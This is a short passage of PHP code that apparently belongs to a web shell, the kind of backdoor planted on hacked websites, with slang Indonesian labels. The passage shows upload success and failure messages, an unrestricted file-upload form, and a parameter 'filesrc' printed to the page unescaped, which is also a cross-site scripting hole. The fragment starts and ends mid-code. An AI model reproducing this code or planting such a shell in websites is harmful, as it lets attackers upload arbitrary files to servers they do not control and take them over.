...
echo '<font color="green">wis manjing boz! .</font><br />';
}else{
echo '<font color="red">gaiso...modyarr!! .</font><br />';
}
}
echo '<form enctype="multipart/form-data" method="POST">
Tusbol Mantan : <input type="file" name="file" />
<input type="submit" value="Tusbol" />
</form>
</td></tr>';
if(isset($_GET['filesrc'])){
echo "<tr><td>Hati Mantan >> ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
